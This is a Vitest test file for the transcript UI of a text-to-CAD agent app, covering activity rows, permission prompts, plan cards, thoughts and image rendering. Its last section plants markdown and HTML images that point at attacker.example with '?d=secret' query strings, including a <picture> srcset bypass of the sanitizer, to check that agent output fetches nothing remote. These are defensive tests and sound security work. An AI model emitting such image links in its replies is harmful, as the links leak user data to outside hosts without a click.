import { beforeEach, describe, expect, it, vi } from "vitest";
import { act, fireEvent, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";

import { TooltipProvider } from "@text-to-cad/ui/primitives/tooltip";
import { ActivityGroup } from "@renderer/features/session/parts/ActivityRow";
import { TranscriptScopeContext } from "@renderer/features/session/links/PathLink";
import { useExplorer } from "@renderer/state/explorer";
import { PermissionCard, verdictLine } from "@renderer/features/session/parts/PermissionCard";
import { SubagentRow } from "@renderer/features/session/parts/SubagentRow";
import { ThoughtPart } from "@renderer/features/session/parts/ThoughtPart";
import { PartsList } from "@renderer/features/session/parts/PartsList";
import { PlanCard } from "@renderer/features/session/PlanCard";
import { activityRow, foldSummary } from "@renderer/features/session/view";
import { useAcp } from "@renderer/state/acp";
import { useSessions } from "@renderer/state/sessions";
import { initialSessionState } from "@shared/acp/types";
import type { PermissionRequestPart, ToolCallPart } from "@shared/acp/types";

const wrap = (ui: React.ReactNode) => render(<TooltipProvider>{ui}</TooltipProvider>);

function call(overrides: Partial<ToolCallPart> & { id: string }): ToolCallPart {
  return {
    type: "tool_call",
    kind: "other",
    title: "",
    name: null,
    status: "completed",
    input: undefined,
    output: undefined,
    content: [],
    locations: [],
    stream: "",
    children: [],
    ...overrides,
  };
}

beforeEach(() => {
  useAcp.setState({ sessions: {}, terminalOutput: {}, coldTerminals: {}, loading: {}, loadErrors: {} });
  useSessions.setState({ sessions: [], ready: true, activeId: null });
});

describe("ActivityGroup", () => {
  it("shows the folded line and opens to the rows", async () => {
    const user = userEvent.setup();
    const rows = [
      call({ id: "e1", kind: "edit", title: "Edit a.py", locations: [{ path: "a.py", line: null }] }),
      call({ id: "c1", kind: "execute", title: "ls", input: { command: "ls -la" } }),
    ].map(activityRow);
    wrap(<ActivityGroup item={{ kind: "activity", key: "g", rows, summary: foldSummary(rows) }} sessionId="s1" />);
    expect(screen.getByText("Edited a.py, ran 1 command")).toBeInTheDocument();
    expect(screen.queryByText("ls -la")).not.toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: /Edited a.py, ran 1 command/ }));
    expect(screen.getByText("Edited a.py")).toBeInTheDocument();
    expect(screen.getByText("ls -la")).toBeInTheDocument();
  });

  /**
   * A lone call is drawn bare and a second one folds both under a summary.
   * The row the person opened is the same row after the fold, still open —
   * not a fresh, closed one under a collapsed summary.
   */
  it("keeps a row the person opened open when a second call joins it", async () => {
    const user = userEvent.setup();
    const first = call({ id: "c1", kind: "execute", title: "ls", input: { command: "ls" }, output: "first output" });
    const second = call({ id: "c2", kind: "execute", title: "pwd", input: { command: "pwd" }, status: "in_progress" });
    const { rerender } = wrap(<PartsList open parts={[first]} prefix="t1" sessionId="s1" />);
    await user.click(screen.getByRole("button", { name: /ls/ }));
    const detail = () => document.querySelector('[data-activity-row="c1"] [data-tool-detail]');
    expect(detail()).not.toBeNull();

    rerender(
      <TooltipProvider>
        <PartsList open parts={[first, second]} prefix="t1" sessionId="s1" />
      </TooltipProvider>,
    );
    expect(screen.getByRole("button", { name: /2 commands/ })).toHaveAttribute("aria-expanded", "true");
    expect(detail()).not.toBeNull();
  });

  it("names what each disclosure opens with aria-controls while it is open", async () => {
    const user = userEvent.setup();
    const first = call({ id: "c1", kind: "execute", title: "ls", input: { command: "ls" }, output: "first output" });
    const second = call({ id: "c2", kind: "execute", title: "pwd", input: { command: "pwd" } });
    wrap(<PartsList open parts={[first, second]} prefix="t1" sessionId="s1" />);
    const group = screen.getByRole("button", { name: /2 commands/ });
    if (group.getAttribute("aria-expanded") !== "true") await user.click(group);
    const rows = document.querySelector(`#${CSS.escape(group.getAttribute("aria-controls") ?? "none")}`);
    expect(rows?.querySelector('[data-activity-row="c1"]')).not.toBeNull();
    const row = screen.getByRole("button", { name: /^ls/ });
    expect(row).not.toHaveAttribute("aria-controls");
    await user.click(row);
    expect(document.getElementById(row.getAttribute("aria-controls")!)).toHaveAttribute("data-tool-detail");
  });

  /**
   * A tool can hand back megabytes — a whole file read, a log. The row draws
   * the first 64 KB of each body and says how much it left out, and a plain
   * string result is text, not JSON for the highlighter to chew through.
   */
  it("draws at most 64 KB of a call's text, input and result, and says how much it left out", async () => {
    const user = userEvent.setup();
    const big = call({
      id: "big",
      kind: "other",
      title: "Dump",
      input: { blob: "a".repeat(5e6) },
      output: "b".repeat(5e6),
      content: [{ type: "text", text: "c".repeat(5e6) }],
    });
    const { container } = wrap(<ActivityGroup item={{ kind: "activity", key: "g", rows: [activityRow(big)], summary: null }} sessionId="s1" />);
    await user.click(screen.getByRole("button", { name: /Dump/ }));

    expect(container.textContent!.length).toBeLessThan(400_000);
    expect(screen.getAllByText(/KB not shown/)).toHaveLength(3);
    const json = [...container.querySelectorAll('[data-language="json"]')];
    expect(json.some((block) => block.textContent!.includes("bbbb"))).toBe(false);
  });

  it("keeps a mixed group neutral and names its failed calls separately", async () => {
    const user = userEvent.setup();
    const rows = [
      call({ id: "ok", kind: "execute", title: "python build.py", input: { command: "python build.py" } }),
      call({ id: "bad", kind: "execute", title: "python check.py", input: { command: "python check.py" }, status: "failed", output: "Missing dependency" }),
    ].map(activityRow);
    const { rerender } = wrap(<ActivityGroup item={{ kind: "activity", key: "g", rows, summary: foldSummary(rows) }} sessionId="s1" />);
    const group = screen.getByRole("button", { name: /Ran 2 commands.*1 failed/ });
    expect(group).not.toHaveClass("text-destructive");
    expect(screen.getByText("1 failed")).toHaveClass("text-destructive");
    await user.click(group);
    expect(screen.getByRole("button", { name: /python build.py/ })).not.toHaveTextContent("Failed");
    const failed = screen.getByRole("button", { name: /python check.py.*Failed/ });
    expect(failed).not.toHaveClass("text-destructive");
    await user.click(failed);
    expect(screen.getByText("Missing dependency")).toBeVisible();
    // A corrected status removes the warning; output text alone never decides failure.
    const updated = rows.map((row) => ({ ...row, status: "completed" as const }));
    rerender(<ActivityGroup item={{ kind: "activity", key: "g", rows: updated, summary: foldSummary(updated) }} sessionId="s1" />);
    expect(screen.queryByText("1 failed")).not.toBeInTheDocument();
    expect(screen.queryByText("Failed")).not.toBeInTheDocument();
  });

  it("says so above a stream that was cut to its tail", async () => {
    const user = userEvent.setup();
    const part = call({ id: "c1", kind: "execute", title: "make", input: { command: "make" }, stream: "…last lines\n", streamTruncated: true });
    const { unmount } = wrap(<ActivityGroup item={{ kind: "activity", key: "g", rows: [activityRow(part)], summary: null }} sessionId="s1" />);
    await user.click(screen.getByRole("button", { name: /make/ }));
    const note = screen.getByText("Earlier output trimmed");
    const terminal = note.parentElement!;
    expect(terminal.firstElementChild).toBe(note);
    unmount();
    wrap(<ActivityGroup item={{ kind: "activity", key: "g", rows: [activityRow({ ...part, streamTruncated: false })], summary: null }} sessionId="s1" />);
    await user.click(screen.getByRole("button", { name: /make/ }));
    expect(screen.queryByText("Earlier output trimmed")).toBeNull();
  });

  describe("a finished command with no output on screen", () => {
    const finished = () =>
      call({ id: "c1", kind: "execute", title: "make", input: { command: "make" }, content: [{ type: "terminal", terminalId: "t1" }] });
    const open = async () => {
      const rows = [activityRow(finished())];
      wrap(<ActivityGroup item={{ kind: "activity", key: "g", rows, summary: null }} sessionId="s1" />);
      await userEvent.setup().click(screen.getByRole("button", { name: /make/ }));
    };

    it("says the output was not kept when the store took the session with the command already in it", async () => {
      const state = { ...initialSessionState("s1", "claude"), status: "idle" as const };
      state.turns = [{ id: "t", role: "agent", parts: [finished()], startedAt: 0, endedAt: 1, stopReason: "end_turn" }];
      act(() => useAcp.getState().receiveState("s1", state));
      await open();
      expect(screen.getByText("Output not kept after reload")).toBeInTheDocument();
      expect(screen.queryByText("(no output)")).toBeNull();
    });

    it("says no output for a command that ran here and printed nothing", async () => {
      await open();
      expect(screen.getByText("(no output)")).toBeInTheDocument();
    });
  });

  it("opens a command row to its output", async () => {
    const user = userEvent.setup();
    const rows = [call({ id: "c1", kind: "execute", title: "ls", input: { command: "ls" }, output: { formatted_output: "a.py\nb.py\n" } })].map(activityRow);
    wrap(<ActivityGroup item={{ kind: "activity", key: "g", rows, summary: null }} sessionId="s1" />);
    await user.click(screen.getByRole("button", { name: /ls/ }));
    expect(screen.getByText(/a\.py\s+b\.py/)).toBeInTheDocument();
  });
});

describe("PermissionCard", () => {
  const part: PermissionRequestPart = {
    type: "permission_request",
    requestId: "perm-1",
    toolCallId: "cmd-1",
    title: "Run ls?",
    description: "Lists the directory.",
    options: [
      { optionId: "reject", name: "No", kind: "reject_once", description: null },
      { optionId: "allow-once", name: "Yes", kind: "allow_once", description: null },
      { optionId: "allow-always", name: "Yes, always", kind: "allow_always", description: null },
    ],
    outcome: { state: "pending" },
  };

  it("offers one button per option, allow first, and answers through the store", async () => {
    const user = userEvent.setup();
    const respond = vi.fn(async () => undefined);
    (window.textToCad.sessions as unknown as { respondPermission: unknown }).respondPermission = respond;
    wrap(<PermissionCard part={part} sessionId="s1" />);
    expect(screen.getByText("Run ls?")).toBeInTheDocument();
    expect(screen.getByText("Lists the directory.")).toBeInTheDocument();
    const buttons = screen.getAllByRole("button").map((button) => button.textContent);
    expect(buttons).toEqual(["Yes", "Yes, always", "No"]);
    await user.click(screen.getByRole("button", { name: "Yes, always" }));
    expect(respond).toHaveBeenCalledWith({ id: "s1", requestId: "perm-1", optionId: "allow-always" });
  });

  it("shows main's reason when the answer is refused, rather than doing nothing", async () => {
    const user = userEvent.setup();
    const respond = vi.fn(async () => {
      throw new Error(
        "Error invoking remote method 'text-to-cad:sessions.respondPermission': IpcError: the session is not connected; load it first",
      );
    });
    (window.textToCad.sessions as unknown as { respondPermission: unknown }).respondPermission = respond;
    wrap(<PermissionCard part={part} sessionId="s1" />);
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Yes" }));
    expect(respond).toHaveBeenCalled();
    expect(await screen.findByRole("status")).toHaveTextContent(/^the session is not connected; load it first$/);
  });

  it("falls back to the expired line when the refusal has no message", async () => {
    const user = userEvent.setup();
    (window.textToCad.sessions as unknown as { respondPermission: unknown }).respondPermission = vi.fn(async () => {
      throw new Error("");
    });
    wrap(<PermissionCard part={part} sessionId="s1" />);
    await user.click(screen.getByRole("button", { name: "Yes" }));
    expect(await screen.findByText("This request has expired — reconnect and ask again.")).toBeInTheDocument();
  });

  it("folds to the decision once answered, stated rather than asked again", () => {
    const { unmount } = wrap(<PermissionCard part={{ ...part, outcome: { state: "selected", optionId: "reject" } }} sessionId="s1" />);
    expect(screen.getByText("Rejected: run ls")).toBeInTheDocument();
    expect(screen.queryByText(/\?/)).not.toBeInTheDocument();
    expect(screen.queryByRole("button")).not.toBeInTheDocument();
    unmount();
    wrap(
      <PermissionCard
        part={{ ...part, title: "Delete the build directory?", outcome: { state: "selected", optionId: "allow-once" } }}
        sessionId="s1"
      />,
    );
    expect(screen.getByText("Allowed: delete the build directory")).toBeInTheDocument();
  });

  it("words every outcome", () => {
    const yes = part.options[1]!;
    const always = part.options[2]!;
    const no = part.options[0]!;
    expect(verdictLine(true, yes, "Delete the build directory?")).toBe("Allowed: delete the build directory");
    expect(verdictLine(true, always, "Edit README.md?")).toBe("Always allowed: edit README.md");
    expect(verdictLine(false, no, "README.md edits?")).toBe("Rejected: README.md edits");
    expect(verdictLine(null, null, "Run ls?")).toBe("Cancelled: run ls");
    expect(verdictLine(true, yes, null)).toBe("Allowed (Yes)");
  });

  it("renders backticked commands as inline code, not literal backticks", () => {
    wrap(
      <PermissionCard
        part={{ ...part, title: "Delete the build directory?", description: "Runs `rm -rf build` in the project." }}
        sessionId="s1"
      />,
    );
    const code = screen.getByText("rm -rf build");
    expect(code.tagName).toBe("CODE");
    expect(document.body.textContent).not.toContain("`");
  });
});

describe("PlanCard", () => {
  it("titles itself with the current step and counts progress", () => {
    wrap(
      <PlanCard
        entries={[
          { content: "Read the notes", priority: "medium", status: "completed" },
          { content: "Write the script", priority: "high", status: "in_progress" },
          { content: "Run it", priority: "low", status: "pending" },
        ]}
        endedAt={null}
        running={false}
        startedAt={null}
      />,
    );
    expect(screen.getByText("Write the script")).toBeInTheDocument();
    expect(screen.getByText("1 of 3 done")).toBeInTheDocument();
    // The words sit beside the icon and the toggle comes last.
    const header = document.querySelector("[data-plan-header]")!;
    const toggle = screen.getByRole("button", { name: "Toggle plan" });
    expect(header.lastElementChild!.contains(toggle)).toBe(true);
    expect(header.children[1]!.textContent).toBe("Write the script1 of 3 done");
    expect(document.querySelector("[data-plan-complete]")).toBeNull();
  });

  /**
   * A finished plan's clock is the length of its turn, whenever it is drawn:
   * a remount an hour later, or a later turn running, does not make it tick.
   */
  it("says how long a finished plan's turn took, not how long ago it started", () => {
    vi.useFakeTimers({ now: 3_600_000, toFake: ["Date"] });
    try {
      wrap(
        <PlanCard
          endedAt={13_000}
          entries={[{ content: "Read the notes", priority: "medium", status: "completed" }]}
          running={false}
          startedAt={1_000}
        />,
      );
      expect(screen.getByText("1 of 1 done · 12s")).toBeInTheDocument();
    } finally {
      vi.useRealTimers();
    }
  });

  it("folds a finished plan to one line that still opens to the steps", async () => {
    const user = userEvent.setup();
    wrap(
      <PlanCard
        entries={[
          { content: "Read the notes", priority: "medium", status: "completed" },
          { content: "Run it", priority: "low", status: "completed" },
        ]}
        endedAt={null}
        running={false}
        startedAt={null}
      />,
    );
    const card = document.querySelector("[data-plan-card]")!;
    expect(card).toHaveAttribute("data-plan-complete");
    expect(screen.getByText("Plan complete")).toBeInTheDocument();
    expect(screen.getByText("2 of 2 done")).toBeInTheDocument();
    expect(screen.queryByText("Run it")).not.toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Toggle plan" }));
    expect(screen.getByText("Run it")).toBeInTheDocument();
  });
});

describe("transcript marks", () => {
  it("puts the thought's chevron first, where the activity group's is", () => {
    wrap(<ThoughtPart streaming={false} text="Consider the notes." />);
    const trigger = screen.getByRole("button", { name: /Thought/ });
    expect(trigger.firstElementChild).toHaveAttribute("data-thought-chevron");
  });

  /**
   * The stock Reasoning closes itself a second after streaming ends — meant
   * for the one it opened itself. A thought the person opened is theirs to
   * close: it stays open when the streaming ends, and when they open one
   * that has already finished.
   */
  it("leaves a thought the person opened open when it stops streaming", async () => {
    vi.useFakeTimers();
    try {
      const { rerender } = wrap(<ThoughtPart streaming text="Consider the notes." />);
      fireEvent.click(screen.getByRole("button", { name: /Thinking/ }));
      expect(screen.getByText("Consider the notes.")).toBeInTheDocument();
      rerender(
        <TooltipProvider>
          <ThoughtPart streaming={false} text="Consider the notes." />
        </TooltipProvider>,
      );
      await act(async () => {
        await vi.advanceTimersByTimeAsync(2_000);
      });
      expect(screen.getByRole("button", { name: /Thought/ })).toHaveAttribute("aria-expanded", "true");
    } finally {
      vi.useRealTimers();
    }
  });

  it("marks a finished subagent with a check and a running one with its orb", () => {
    const base = { type: "subagent" as const, sessionId: "c1", name: "Docs checker", task: "confirm the README", parts: [] };
    const { unmount } = wrap(<SubagentRow part={{ ...base, state: "completed" }} sessionId="s1" />);
    expect(document.querySelector("[data-subagent-mark=completed]")).not.toBeNull();
    unmount();
    wrap(<SubagentRow part={{ ...base, state: "running" }} sessionId="s1" />);
    expect(document.querySelector("[data-subagent-mark=running]")).not.toBeNull();
  });
});

describe("an activity row about a CAD file", () => {
  const scoped = (ui: React.ReactNode) =>
    wrap(<TranscriptScopeContext.Provider value={{ projectId: "p1", root: null }}>{ui}</TranscriptScopeContext.Provider>);

  it("opens the file in this session's explorer", async () => {
    const user = userEvent.setup();
    const openFile = vi.fn(() => null);
    useSessions.setState({ sessions: [{ id: "s1", projectId: "p1", cwd: "/bracket" } as never] });
    useExplorer.setState({ sessionId: "s1", openFile } as never);
    const rows = [call({ id: "e1", kind: "edit", title: "Edit part.step", locations: [{ path: "/bracket/models/part.step", line: null }] })].map(activityRow);
    scoped(<ActivityGroup item={{ kind: "activity", key: "g", rows, summary: null }} sessionId="s1" />);

    await user.click(screen.getByRole("button", { name: "Open" }));
    expect(openFile).toHaveBeenCalledWith("models/part.step", null);
  });

  it("offers nothing for a script, a file outside the folder, or another session's explorer", () => {
    useSessions.setState({ sessions: [{ id: "s1", projectId: "p1", cwd: "/bracket" } as never] });
    useExplorer.setState({ sessionId: "s1" } as never);
    const rows = [
      call({ id: "a", kind: "edit", title: "Edit build.py", locations: [{ path: "/bracket/build.py", line: null }] }),
      call({ id: "b", kind: "read", title: "Read other.step", locations: [{ path: "/elsewhere/other.step", line: null }] }),
    ].map(activityRow);
    const { unmount } = scoped(<ActivityGroup item={{ kind: "activity", key: "g", rows: [rows[0]!], summary: null }} sessionId="s1" />);
    expect(screen.queryByRole("button", { name: "Open" })).toBeNull();
    unmount();
    const second = scoped(<ActivityGroup item={{ kind: "activity", key: "g", rows: [rows[1]!], summary: null }} sessionId="s1" />);
    expect(screen.queryByRole("button", { name: "Open" })).toBeNull();
    second.unmount();
    useExplorer.setState({ sessionId: "s2" } as never);
    const cad = [call({ id: "c", kind: "edit", title: "Edit part.step", locations: [{ path: "/bracket/part.step", line: null }] })].map(activityRow);
    scoped(<ActivityGroup item={{ kind: "activity", key: "g", rows: cad, summary: null }} sessionId="s1" />);
    expect(screen.queryByRole("button", { name: "Open" })).toBeNull();
  });
});

describe("an image in the agent's words", () => {
  const scoped = (ui: React.ReactNode) =>
    wrap(<TranscriptScopeContext.Provider value={{ projectId: "p1", root: null }}>{ui}</TranscriptScopeContext.Provider>);
  // A remote `src` is a request on paint: whatever the agent put in its query
  // string leaves the machine without a click.
  const remote = () => document.querySelectorAll('img[src^="https:"], img[src^="http:"], img[src^="//"]');

  it("fetches nothing remote from a markdown image or a raw <img>, and says the address", async () => {
    scoped(
      <PartsList
        open={false}
        parts={[
          { type: "text", text: "Here: ![chart](https://attacker.example/x.png?d=secret)" },
          { type: "text", text: 'Raw: <img src="https://attacker.example/y.png?d=secret" />' },
        ]}
        prefix="t"
        sessionId="s1"
      />,
    );
    await screen.findByText(/Raw:/);
    expect(remote()).toHaveLength(0);
    expect(screen.getByText(/attacker\.example\/x\.png/)).toBeInTheDocument();
    expect(screen.getByText(/attacker\.example\/y\.png/)).toBeInTheDocument();
  });

  it("fetches nothing remote from a thought", async () => {
    const user = userEvent.setup();
    wrap(<ThoughtPart streaming={false} text="Looked at ![](https://attacker.example/z.png?d=secret)" />);
    await user.click(screen.getByRole("button", { name: /Thought/ }));
    await screen.findByText(/Looked at/);
    expect(remote()).toHaveLength(0);
    expect(screen.getByText(/attacker\.example\/z\.png/)).toBeInTheDocument();
  });

  // Streamdown's sanitizer keeps `<picture>` and `<source srcset>` with no
  // protocol check on `srcset`: the browser fetches a `<source>` inside a
  // `<picture>` in place of the `<img>` that is its child — here a project
  // file, drawn — so the `https:` address would leave without a click.
  const PICTURE = '<picture><source srcset="https://attacker.example/p.png?d=secret"><img alt="front" src="./renders/front.png"></picture>';
  const sourced = () => document.querySelectorAll("source, [srcset]");

  it("drops a <picture>'s <source> in prose", async () => {
    vi.mocked(window.textToCad.explorer.readBinary).mockResolvedValue({
      path: "renders/front.png",
      mime: "image/png",
      size: 4,
      dataUrl: "data:image/png;base64,AAAA",
    });
    scoped(<PartsList open={false} parts={[{ type: "text", text: `Look: ${PICTURE}` }]} prefix="t" sessionId="s1" />);
    expect(await screen.findByAltText("front")).toHaveAttribute("src", "data:image/png;base64,AAAA");
    expect(sourced()).toHaveLength(0);
    expect(remote()).toHaveLength(0);
  });

  it("drops a <picture>'s <source> in a thought", async () => {
    const user = userEvent.setup();
    wrap(<ThoughtPart streaming={false} text={`Looked at ${PICTURE}`} />);
    await user.click(screen.getByRole("button", { name: /Thought/ }));
    await screen.findByText(/Looked at/);
    expect(sourced()).toHaveLength(0);
    expect(remote()).toHaveLength(0);
  });

  it("gets no data: image through the sanitizer — a project file is the one way to draw", async () => {
    scoped(
      <PartsList open={false} parts={[{ type: "text", text: "Inline: ![dot](data:image/png;base64,AAAA)" }]} prefix="t" sessionId="s1" />,
    );
    await screen.findByText(/Inline:/);
    expect(document.querySelectorAll("img")).toHaveLength(0);
  });

  // rehype-harden cannot parse a bare relative source and blocked it before the transcript's
  // `img` was asked: `![r](render.png)` read "[Image blocked: r]" however real the file.
  it("draws a project file named without a ./, in prose and in a thought", async () => {
    const user = userEvent.setup();
    const readBinary = vi.mocked(window.textToCad.explorer.readBinary);
    readBinary.mockResolvedValue({ path: "render.png", mime: "image/png", size: 4, dataUrl: "data:image/png;base64,AAAA" });
    scoped(
      <>
        <PartsList open={false} parts={[{ type: "text", text: "A render: ![r](render.png)" }]} prefix="t" sessionId="s1" />
        <ThoughtPart streaming={false} text={'Looked at <img alt="t" src="render.png">'} />
      </>,
    );
    expect(await screen.findByAltText("r")).toHaveAttribute("src", "data:image/png;base64,AAAA");
    await user.click(screen.getByRole("button", { name: /Thought/ }));
    expect(await screen.findByAltText("t")).toHaveAttribute("src", "data:image/png;base64,AAAA");
    expect(readBinary).toHaveBeenCalledWith({ projectId: "p1", path: "render.png" });
    expect(screen.queryByText(/Image blocked/)).toBeNull();
  });

  it("draws a project file, read through the project", async () => {
    const readBinary = vi.mocked(window.textToCad.explorer.readBinary);
    readBinary.mockResolvedValueOnce({ path: "renders/front.png", mime: "image/png", size: 4, dataUrl: "data:image/png;base64,AAAA" });
    scoped(
      <PartsList
        open={false}
        parts={[{ type: "text", text: "The front: ![front](./renders/front.png)" }]}
        prefix="t"
        sessionId="s1"
      />,
    );
    expect(await screen.findByAltText("front")).toHaveAttribute("src", "data:image/png;base64,AAAA");
    expect(readBinary).toHaveBeenCalledWith({ projectId: "p1", path: "renders/front.png" });
  });
});
